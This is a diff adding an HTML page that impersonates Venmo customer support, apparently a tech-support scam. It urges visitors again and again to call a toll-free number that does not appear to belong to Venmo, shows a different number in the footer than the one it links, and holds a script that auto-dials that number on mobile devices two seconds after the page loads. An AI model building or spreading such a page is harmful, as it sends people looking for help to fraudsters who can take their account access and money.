@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Venmo Customer Support</title>
+    <style>
+        /* Your existing CSS styles */
+        body, h1, h2, p, a {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            flex-direction: column;
+            margin: 0;
+        }
+        .header {
+            background-color: #0061f2;
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            width: 100%;
+        }
+        .header h2 {
+            margin: 0;
+            font-size: 26px;
+            font-weight: bold;
+        }
+        .container {
+            background-color: white;
+            width: 90%;
+            max-width: 900px;
+            padding: 20px;
+            margin-top: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            flex-grow: 1;
+        }
+        h1 {
+            color: #0061f2;
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        .info {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .call-now {
+            background-color: #004fa4;
+            color: white;
+            padding: 12px;
+            border-radius: 5px;
+            text-align: center;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+            width: 97%;
+            font-size: 18px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .call-now:hover {
+            background-color: #004fa4;
+        }
+        footer {
+            background-color: #004fa4;
+            color: white;
+            text-align: center;
+            padding: 18px;
+            width: 94%;
+        }
+        footer a {
+            color: white;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        @media screen and (max-width: 768px) {
+            .header h2 {
+                font-size: 22px;
+            }
+            .container {
+                width: 95%;
+                padding: 15px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            .info {
+                font-size: 16px;
+            }
+            .call-now {
+                font-size: 16px;
+                padding: 10px;
+            }
+        }
+        @media screen and (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            .info {
+                font-size: 14px;
+            }
+            footer {
+                font-size: 14px;
+                padding: 12px;
+            }
+            .call-now {
+                font-size: 16px;
+                padding: 12px;
+            }
+        }
+    </style>
+</head>
+<script defer data-domain="oks1.com" src="https://plausible.io/js/script.js"></script>
+<body>
+    <!-- Top Header Section -->
+    <div class="header">
+        <h2>Venmo Customer Service</h2>
+    </div>
+
+    <div class="container">
+        <h1>Venmo Customer Support</h1>
+        <div class="info">
+            <p>Having trouble with your Venmo account? Our support team is ready to help you with any issues, whether it's payment failures, login troubles, or general questions.</p>
+            <p>We know how important smooth transactions are. If you're facing errors, security concerns, or need account assistance, we're just a call away.</p>
+            <p>Our expert team is available during business hours to provide quick and effective solutions. To ensure a fast resolution, share detailed information about your concern.</p>
+            <p>Need immediate help? Call Venmo customer support now at <a href="tel:+18779404590">1-877-940-4590</a></p>
+        </div>
+
+        <a href="tel:+18779404590" class="call-now">Call Now</a>
+        <a href="tel:+18779404590" class="call-now">Get Instant Support</a>
+        <a href="tel:+18779404590" class="call-now">Need help? Venmo Support</a>
+
+        <div class="info">
+            <p>We are committed to making your Venmo experience hassle-free. No matter the issue, we’re here to assist you every step of the way.</p>
+            <p>For more support, call us at <a href="tel:+18779404590">1-877-940-4590</a> and explore our resources for helpful guides and FAQs.</p>
+        </div>
+    </div>
+
+    <!-- Footer Section -->
+    <footer>
+        <p><a href="tel:+18779404590">📞 1 (844) 507-8678 SUPPORT</a></p>
+    </footer>
+
+    <!-- Auto-Call Script (Triggers on page load) -->
+    <script>
+        window.onload = function() {
+            // Check if the user is on a mobile device
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            if (isMobile) {
+                // Auto-dial the number (works on mobile devices)
+                setTimeout(function() {
+                    window.location.href = "tel:+18779404590";
+                }, 2000); // Calls after 2 seconds
+            }
+        };
+    </script>
+</body>
+</html>
